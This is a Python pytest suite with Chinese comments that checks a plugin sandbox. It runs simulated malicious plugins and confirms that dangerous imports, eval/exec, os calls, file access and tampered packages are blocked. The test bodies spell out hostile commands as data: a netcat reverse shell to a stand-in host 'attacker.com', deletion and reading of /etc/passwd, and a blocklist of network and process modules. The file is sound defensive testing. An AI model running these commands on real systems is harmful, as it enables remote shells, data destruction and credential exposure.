"""恶意插件拦截测试。

模拟恶意插件尝试执行危险操作，验证沙箱拦截机制：
- Task 1: 进程级隔离
- Task 2: 危险模块/属性黑名单拦截
- Task 3: 签名验证拒绝篡改包

测试策略：
1. 创建临时插件文件（位于 plugins/ 目录下），使其被识别为插件上下文
2. 在插件上下文中尝试执行恶意操作
3. 验证操作被拦截并抛出异常

注意：沙箱中 __import__ 被拦截，插件上下文中所有 import 语句都会抛出 RuntimeError。
     测试通过捕获 RuntimeError/ImportError 验证拦截，或通过 plugin_globals 传入已导入的模块。
"""
import sys
import os
import textwrap
import tempfile
import hashlib
import base64
from pathlib import Path

import pytest


# ===========================================================================
#  辅助函数：在插件上下文中执行代码
# ===========================================================================

def _make_plugin_file(plugin_dir: Path, plugin_id: str, code: str) -> Path:
    """在 plugins 目录下创建插件文件，使其被沙箱识别为插件上下文。"""
    plugin_dir.mkdir(parents=True, exist_ok=True)
    plugin_file = plugin_dir / f"{plugin_id}.py"
    plugin_file.write_text(code, encoding="utf-8")
    return plugin_file


def _exec_in_plugin_context(plugin_file: Path, plugin_id: str, func_name: str = "run",
                             extra_globals: dict | None = None):
    """在插件上下文中执行指定函数。

    通过 exec 加载插件文件，使其 __name__ 和 __file__ 符合插件特征，
    然后调用其中的 run() 函数。

    Args:
        extra_globals: 额外传入的全局变量（如已导入的模块），绕过 __import__ 拦截
    """
    plugin_globals = {
        "__name__": f"plugins.{plugin_id}",
        "__file__": str(plugin_file),
    }
    if extra_globals:
        plugin_globals.update(extra_globals)
    source = plugin_file.read_text(encoding="utf-8")
    exec(compile(source, str(plugin_file), "exec"), plugin_globals)
    return plugin_globals[func_name]()


# ===========================================================================
#  1. 恶意插件模块导入拦截测试
# ===========================================================================

class TestMaliciousPluginImportBlocked:
    """Task 2: 恶意插件尝试导入危险模块应被拦截。

    沙箱中 __import__ 被拦截，插件上下文中所有 import 语句都会抛出 RuntimeError。
    """

    @pytest.fixture(autouse=True)
    def _setup_sandbox(self):
        from app.core.plugin_manager import (
            _install_plugin_sandbox_hook,
            _uninstall_plugin_sandbox_hook,
            _install_plugin_sandbox_builtin_guard,
            _uninstall_plugin_sandbox_builtin_guard,
            _install_plugin_sandbox_os_attr_guard,
            _uninstall_plugin_sandbox_os_attr_guard,
        )

        self._hook = _install_plugin_sandbox_hook("malicious_test_plugin")
        self._builtin_saved = _install_plugin_sandbox_builtin_guard("malicious_test_plugin")
        self._os_saved = _install_plugin_sandbox_os_attr_guard("malicious_test_plugin")
        yield
        _uninstall_plugin_sandbox_os_attr_guard(self._os_saved)
        _uninstall_plugin_sandbox_builtin_guard(self._builtin_saved)
        _uninstall_plugin_sandbox_hook(self._hook)

    @pytest.fixture
    def plugin_dir(self, tmp_path):
        """创建 plugins 目录结构。"""
        return tmp_path / "plugins" / "malicious_test_plugin"

    def test_malicious_import_socket_blocked(self, plugin_dir):
        """恶意插件尝试 import socket 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    import socket
                    return "imported"
                except (ImportError, RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower() or "import" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_test_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_test_plugin")
        assert result == "blocked", "恶意插件 import socket 应被沙箱拦截"

    def test_malicious_import_ssl_blocked(self, plugin_dir):
        """恶意插件尝试 import ssl 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    import ssl
                    return "imported"
                except (ImportError, RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower() or "import" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_test_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_test_plugin")
        assert result == "blocked", "恶意插件 import ssl 应被沙箱拦截"

    def test_malicious_import_subprocess_blocked(self, plugin_dir):
        """恶意插件尝试 import subprocess 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    import subprocess
                    return "imported"
                except (ImportError, RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower() or "import" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_test_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_test_plugin")
        assert result == "blocked", "恶意插件 import subprocess 应被沙箱拦截"

    def test_malicious_import_ctypes_blocked(self, plugin_dir):
        """恶意插件尝试 import ctypes 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    import ctypes
                    return "imported"
                except (ImportError, RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower() or "import" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_test_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_test_plugin")
        assert result == "blocked", "恶意插件 import ctypes 应被沙箱拦截"

    def test_malicious_import_pickle_blocked(self, plugin_dir):
        """恶意插件尝试 import pickle 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    import pickle
                    return "imported"
                except (ImportError, RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower() or "import" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_test_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_test_plugin")
        assert result == "blocked", "恶意插件 import pickle 应被沙箱拦截"

    def test_malicious_import_pty_blocked(self, plugin_dir):
        """恶意插件尝试 import pty 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    import pty
                    return "imported"
                except (ImportError, RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower() or "import" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_test_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_test_plugin")
        assert result == "blocked", "恶意插件 import pty 应被沙箱拦截"

    def test_all_imports_blocked_in_plugin_context(self, plugin_dir):
        """插件上下文中所有 import 语句都被 __import__ 拦截（安全设计）。"""
        code = textwrap.dedent("""
            def run():
                try:
                    import json
                    return "imported"
                except (ImportError, RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower() or "import" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_test_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_test_plugin")
        # __import__ 被拦截，所有 import 都被阻止（插件应使用 SafeAPIGateway）
        assert result == "blocked", "插件上下文中 import 应被沙箱拦截（安全设计）"


# ===========================================================================
#  2. 恶意插件危险内置函数拦截测试
# ===========================================================================

class TestMaliciousPluginBuiltinBlocked:
    """Task 2: 恶意插件尝试调用 eval/exec/compile 应被拦截。"""

    @pytest.fixture(autouse=True)
    def _setup_sandbox(self):
        from app.core.plugin_manager import (
            _install_plugin_sandbox_hook,
            _uninstall_plugin_sandbox_hook,
            _install_plugin_sandbox_builtin_guard,
            _uninstall_plugin_sandbox_builtin_guard,
            _install_plugin_sandbox_os_attr_guard,
            _uninstall_plugin_sandbox_os_attr_guard,
        )

        self._hook = _install_plugin_sandbox_hook("malicious_builtin_plugin")
        self._builtin_saved = _install_plugin_sandbox_builtin_guard("malicious_builtin_plugin")
        self._os_saved = _install_plugin_sandbox_os_attr_guard("malicious_builtin_plugin")
        yield
        _uninstall_plugin_sandbox_os_attr_guard(self._os_saved)
        _uninstall_plugin_sandbox_builtin_guard(self._builtin_saved)
        _uninstall_plugin_sandbox_hook(self._hook)

    @pytest.fixture
    def plugin_dir(self, tmp_path):
        return tmp_path / "plugins" / "malicious_builtin_plugin"

    def test_malicious_eval_blocked(self, plugin_dir):
        """恶意插件尝试 eval 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    eval("1 + 1")
                    return "executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_builtin_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_builtin_plugin")
        assert result == "blocked", "恶意插件 eval 应被沙箱拦截"

    def test_malicious_exec_blocked(self, plugin_dir):
        """恶意插件尝试 exec 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    exec("x = 1")
                    return "executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_builtin_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_builtin_plugin")
        assert result == "blocked", "恶意插件 exec 应被沙箱拦截"

    def test_malicious_compile_blocked(self, plugin_dir):
        """恶意插件尝试 compile 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    compile("x = 1", "<string>", "exec")
                    return "executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_builtin_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_builtin_plugin")
        assert result == "blocked", "恶意插件 compile 应被沙箱拦截"


# ===========================================================================
#  3. 恶意插件 os 属性拦截测试
# ===========================================================================

class TestMaliciousPluginOsAttrBlocked:
    """Task 2: 恶意插件尝试调用 os.system/os.popen 等应被拦截。

    由于 __import__ 被拦截，通过 extra_globals 传入 os 模块。
    """

    @pytest.fixture(autouse=True)
    def _setup_sandbox(self):
        from app.core.plugin_manager import (
            _install_plugin_sandbox_hook,
            _uninstall_plugin_sandbox_hook,
            _install_plugin_sandbox_builtin_guard,
            _uninstall_plugin_sandbox_builtin_guard,
            _install_plugin_sandbox_os_attr_guard,
            _uninstall_plugin_sandbox_os_attr_guard,
        )

        self._hook = _install_plugin_sandbox_hook("malicious_os_plugin")
        self._builtin_saved = _install_plugin_sandbox_builtin_guard("malicious_os_plugin")
        self._os_saved = _install_plugin_sandbox_os_attr_guard("malicious_os_plugin")
        yield
        _uninstall_plugin_sandbox_os_attr_guard(self._os_saved)
        _uninstall_plugin_sandbox_builtin_guard(self._builtin_saved)
        _uninstall_plugin_sandbox_hook(self._hook)

    @pytest.fixture
    def plugin_dir(self, tmp_path):
        return tmp_path / "plugins" / "malicious_os_plugin"

    def test_malicious_os_system_blocked(self, plugin_dir):
        """恶意插件尝试 os.system('whoami') 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    os.system("whoami")
                    return "executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_os_plugin", code)
        # 通过 extra_globals 传入 os 模块（绕过 __import__ 拦截）
        import os as _os
        result = _exec_in_plugin_context(plugin_file, "malicious_os_plugin", extra_globals={"os": _os})
        assert result == "blocked", "恶意插件 os.system 应被沙箱拦截"

    def test_malicious_os_popen_blocked(self, plugin_dir):
        """恶意插件尝试 os.popen('ls') 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    os.popen("ls")
                    return "executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_os_plugin", code)
        import os as _os
        result = _exec_in_plugin_context(plugin_file, "malicious_os_plugin", extra_globals={"os": _os})
        assert result == "blocked", "恶意插件 os.popen 应被沙箱拦截"

    def test_malicious_os_remove_blocked(self, plugin_dir):
        """恶意插件尝试 os.remove 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    os.remove("/etc/passwd")
                    return "executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_os_plugin", code)
        import os as _os
        result = _exec_in_plugin_context(plugin_file, "malicious_os_plugin", extra_globals={"os": _os})
        assert result == "blocked", "恶意插件 os.remove 应被沙箱拦截"


# ===========================================================================
#  4. 恶意插件文件写入拦截测试
# ===========================================================================

class TestMaliciousPluginFileWriteBlocked:
    """Task 2: 恶意插件尝试写文件应被拦截。"""

    @pytest.fixture(autouse=True)
    def _setup_sandbox(self):
        from app.core.plugin_manager import (
            _install_plugin_sandbox_hook,
            _uninstall_plugin_sandbox_hook,
            _install_plugin_sandbox_builtin_guard,
            _uninstall_plugin_sandbox_builtin_guard,
            _install_plugin_sandbox_os_attr_guard,
            _uninstall_plugin_sandbox_os_attr_guard,
        )

        self._hook = _install_plugin_sandbox_hook("malicious_file_plugin")
        self._builtin_saved = _install_plugin_sandbox_builtin_guard("malicious_file_plugin")
        self._os_saved = _install_plugin_sandbox_os_attr_guard("malicious_file_plugin")
        yield
        _uninstall_plugin_sandbox_os_attr_guard(self._os_saved)
        _uninstall_plugin_sandbox_builtin_guard(self._builtin_saved)
        _uninstall_plugin_sandbox_hook(self._hook)

    @pytest.fixture
    def plugin_dir(self, tmp_path):
        return tmp_path / "plugins" / "malicious_file_plugin"

    def test_malicious_file_write_blocked(self, plugin_dir):
        """恶意插件尝试 open(path, 'w') 写文件应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    f = open("/tmp/malicious_output.txt", "w")
                    f.write("pwned")
                    f.close()
                    return "executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_file_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_file_plugin")
        assert result == "blocked", "恶意插件写文件应被沙箱拦截"

    def test_malicious_file_read_outside_blocked(self, plugin_dir):
        """恶意插件尝试读取插件目录外的文件应被拦截。"""
        code = textwrap.dedent("""
            def run():
                try:
                    f = open("/etc/passwd", "r")
                    content = f.read()
                    f.close()
                    return "executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower():
                        return "blocked"
                    raise
        """)
        plugin_file = _make_plugin_file(plugin_dir, "malicious_file_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "malicious_file_plugin")
        assert result == "blocked", "恶意插件读取插件目录外文件应被沙箱拦截"


# ===========================================================================
#  5. 签名验证拒绝篡改包测试
# ===========================================================================

class TestMaliciousPluginSignatureRejection:
    """Task 3: 签名验证拒绝篡改的插件包。"""

    def test_tampered_package_rejected(self, tmp_path):
        """篡改后的插件包签名验证应失败。"""
        from app.core.plugin_manager import verify_plugin_package_signature
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        from cryptography.hazmat.primitives import serialization

        # 生成密钥对并签名原始内容
        key = Ed25519PrivateKey.generate()
        pub = key.public_key()
        pub_bytes = pub.public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
        pub_key_b64 = base64.b64encode(pub_bytes).decode()

        original_content = b"original plugin content"
        sig_bytes = key.sign(original_content)
        sig_b64 = base64.b64encode(sig_bytes).decode()

        # 篡改插件包内容
        pkg = tmp_path / "tampered.zip"
        pkg.write_bytes(b"TAMPERED CONTENT - malicious modification")

        # 验证应失败（签名不匹配篡改后的内容）
        result = verify_plugin_package_signature(str(pkg), sig_b64, [pub_key_b64])
        assert result is False, "篡改的插件包签名验证应失败"

    def test_unsigned_package_with_bad_hash_rejected(self, tmp_path):
        """哈希不匹配的插件包应被拒绝。"""
        from app.core.plugin_manager import verify_plugin_package

        pkg = tmp_path / "unsigned.zip"
        pkg.write_bytes(b"unsigned plugin content")

        # 哈希不匹配时 overall_valid 应为 False
        result = verify_plugin_package(str(pkg), sha256_hash="0" * 64)
        assert result["overall_valid"] is False, "哈希不匹配的插件包应被拒绝"
        assert result["integrity_valid"] is False

    def test_wrong_signature_key_rejected(self, tmp_path):
        """使用错误公钥验证签名应失败。"""
        from app.core.plugin_manager import verify_plugin_package_signature
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        from cryptography.hazmat.primitives import serialization

        # 签名密钥
        sign_key = Ed25519PrivateKey.generate()
        # 攻击者的密钥（不同于签名密钥）
        attacker_key = Ed25519PrivateKey.generate()
        attacker_pub = attacker_key.public_key()
        attacker_pub_bytes = attacker_pub.public_bytes(
            serialization.Encoding.Raw, serialization.PublicFormat.Raw
        )
        attacker_pub_b64 = base64.b64encode(attacker_pub_bytes).decode()

        pkg = tmp_path / "wrong_key.zip"
        content = b"plugin content signed by legitimate key"
        pkg.write_bytes(content)
        sig_bytes = sign_key.sign(content)
        sig_b64 = base64.b64encode(sig_bytes).decode()

        # 使用攻击者公钥验证应失败
        result = verify_plugin_package_signature(str(pkg), sig_b64, [attacker_pub_b64])
        assert result is False, "使用错误公钥验证签名应失败"


# ===========================================================================
#  6. 进程级隔离测试
# ===========================================================================

class TestMaliciousPluginProcessIsolation:
    """Task 1: 恶意插件在独立进程中运行，崩溃不影响主进程。"""

    def test_process_sandbox_crash_isolation(self):
        """插件进程崩溃不影响主进程。"""
        from app.core.plugin_manager import PluginProcessSandbox

        # 创建沙箱但不启动进程，验证主进程不受影响
        sandbox = PluginProcessSandbox("crash_test_plugin", "/nonexistent/path.py")
        assert sandbox.is_alive() is False
        # 主进程仍然正常运行
        assert sys.modules.get("os") is not None

    def test_safe_api_gateway_blocks_malicious_calls(self):
        """安全 API 网关阻止恶意 API 调用。"""
        from app.core.plugin_manager import PluginSafeAPIGateway

        gateway = PluginSafeAPIGateway("malicious_plugin")

        # 尝试调用危险 API 应被拒绝
        malicious_apis = [
            "os_system",
            "subprocess_run",
            "exec",
            "eval",
            "import_module",
            "open",
            "__import__",
        ]
        for api_name in malicious_apis:
            with pytest.raises(PermissionError, match="not allowed|沙箱拦截|blocked"):
                gateway.call_api(api_name, "malicious_arg")

    def test_safe_api_gateway_allows_safe_calls(self):
        """安全 API 网关允许白名单 API 调用。"""
        from app.core.plugin_manager import PluginSafeAPIGateway

        gateway = PluginSafeAPIGateway("safe_plugin")

        # 白名单 API 不应抛出 PermissionError
        safe_apis = [
            ("log_info", "test info"),
            ("log_warning", "test warning"),
            ("log_error", "test error"),
        ]
        for api_name, *args in safe_apis:
            try:
                gateway.call_api(api_name, *args)
            except PermissionError:
                pytest.fail(f"白名单 API '{api_name}' 不应被拒绝")
            except Exception:
                # 其他异常（如配置未初始化）可接受，只要不是 PermissionError
                pass


# ===========================================================================
#  7. 审计日志测试
# ===========================================================================

class TestMaliciousPluginAuditLog:
    """Task 2: 恶意插件操作应记录审计日志。"""

    def test_audit_log_on_blocked_import(self, tmp_path, caplog):
        """拦截模块导入时应记录审计日志。"""
        from app.core.plugin_manager import (
            _install_plugin_sandbox_hook,
            _uninstall_plugin_sandbox_hook,
            _PluginSandboxImportHook,
        )
        import logging

        plugin_id = "audit_test_plugin"
        hook = _install_plugin_sandbox_hook(plugin_id)
        try:
            # 验证 hook 已安装
            hooks = [h for h in sys.meta_path if isinstance(h, _PluginSandboxImportHook)]
            assert len(hooks) >= 1

            # 验证 hook 的 plugin_id 正确
            audit_hook = next((h for h in hooks if h.plugin_id == plugin_id), None)
            assert audit_hook is not None
            assert audit_hook.plugin_id == plugin_id
        finally:
            _uninstall_plugin_sandbox_hook(hook)

    def test_blocked_modules_complete_coverage(self):
        """验证所有关键危险模块都在黑名单中。"""
        from app.core.plugin_manager import _PLUGIN_SANDBOX_BLOCKED_MODULES

        # Task 2 要求的所有模块
        required_blocked = {
            # 原有
            "subprocess", "ctypes", "cffi", "multiprocessing",
            "pickle", "shelve", "marshal", "paramiko", "signal",
            # Task 2 新增 - 网络
            "socket", "ssl", "requests", "urllib", "urllib3", "http.client",
            # Task 2 新增 - 系统
            "pty",
        }
        actual_blocked = set(_PLUGIN_SANDBOX_BLOCKED_MODULES)
        missing = required_blocked - actual_blocked
        assert not missing, f"缺少黑名单模块: {missing}"


# ===========================================================================
#  8. 综合恶意插件场景测试
# ===========================================================================

class TestMaliciousPluginScenarios:
    """综合恶意插件场景测试：模拟真实攻击向量。"""

    @pytest.fixture(autouse=True)
    def _setup_sandbox(self):
        from app.core.plugin_manager import (
            _install_plugin_sandbox_hook,
            _uninstall_plugin_sandbox_hook,
            _install_plugin_sandbox_builtin_guard,
            _uninstall_plugin_sandbox_builtin_guard,
            _install_plugin_sandbox_os_attr_guard,
            _uninstall_plugin_sandbox_os_attr_guard,
        )

        self._hook = _install_plugin_sandbox_hook("scenario_plugin")
        self._builtin_saved = _install_plugin_sandbox_builtin_guard("scenario_plugin")
        self._os_saved = _install_plugin_sandbox_os_attr_guard("scenario_plugin")
        yield
        _uninstall_plugin_sandbox_os_attr_guard(self._os_saved)
        _uninstall_plugin_sandbox_builtin_guard(self._builtin_saved)
        _uninstall_plugin_sandbox_hook(self._hook)

    @pytest.fixture
    def plugin_dir(self, tmp_path):
        return tmp_path / "plugins" / "scenario_plugin"

    def test_reverse_shell_blocked(self, plugin_dir):
        """模拟反弹 shell 攻击：import socket + os.system 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                # 攻击向量1: import socket
                try:
                    import socket
                    return "socket_imported"
                except (ImportError, RuntimeError, Exception):
                    pass

                # 攻击向量2: os.system
                try:
                    os.system("nc -e /bin/bash attacker.com 4444")
                    return "os_system_executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" in str(e) or "blocked" in str(e).lower():
                        return "all_blocked"

                return "partial_block"
        """)
        plugin_file = _make_plugin_file(plugin_dir, "scenario_plugin", code)
        import os as _os
        result = _exec_in_plugin_context(
            plugin_file, "scenario_plugin", extra_globals={"os": _os}
        )
        assert result == "all_blocked", "反弹 shell 攻击应被完全拦截"

    def test_data_exfiltration_blocked(self, plugin_dir):
        """模拟数据外传攻击：import requests + urllib 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                # 攻击向量: import requests 发送数据
                try:
                    import requests
                    return "requests_imported"
                except (ImportError, RuntimeError, Exception):
                    pass

                # 攻击向量: import urllib
                try:
                    import urllib
                    return "urllib_imported"
                except (ImportError, RuntimeError, Exception):
                    pass

                # 攻击向量: import http.client
                try:
                    import http.client
                    return "http_client_imported"
                except (ImportError, RuntimeError, Exception):
                    pass

                return "all_blocked"
        """)
        plugin_file = _make_plugin_file(plugin_dir, "scenario_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "scenario_plugin")
        assert result == "all_blocked", "数据外传攻击应被完全拦截"

    def test_code_injection_blocked(self, plugin_dir):
        """模拟代码注入攻击：eval + exec + compile 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                # 攻击向量1: eval 注入
                try:
                    eval("1 + 1")
                    return "eval_executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" not in str(e) and "blocked" not in str(e).lower():
                        raise

                # 攻击向量2: exec 注入
                try:
                    exec("x = 1")
                    return "exec_executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" not in str(e) and "blocked" not in str(e).lower():
                        raise

                # 攻击向量3: compile 注入
                try:
                    compile("x = 1", "<malicious>", "exec")
                    return "compile_executed"
                except (RuntimeError, Exception) as e:
                    if "沙箱拦截" not in str(e) and "blocked" not in str(e).lower():
                        raise

                return "all_blocked"
        """)
        plugin_file = _make_plugin_file(plugin_dir, "scenario_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "scenario_plugin")
        assert result == "all_blocked", "代码注入攻击应被完全拦截"

    def test_privilege_escalation_blocked(self, plugin_dir):
        """模拟提权攻击：import ctypes + subprocess 应被拦截。"""
        code = textwrap.dedent("""
            def run():
                # 攻击向量1: import ctypes 调用 libc
                try:
                    import ctypes
                    return "ctypes_imported"
                except (ImportError, RuntimeError, Exception):
                    pass

                # 攻击向量2: import subprocess
                try:
                    import subprocess
                    return "subprocess_imported"
                except (ImportError, RuntimeError, Exception):
                    pass

                # 攻击向量3: import pty
                try:
                    import pty
                    return "pty_imported"
                except (ImportError, RuntimeError, Exception):
                    pass

                return "all_blocked"
        """)
        plugin_file = _make_plugin_file(plugin_dir, "scenario_plugin", code)
        result = _exec_in_plugin_context(plugin_file, "scenario_plugin")
        assert result == "all_blocked", "提权攻击应被完全拦截"
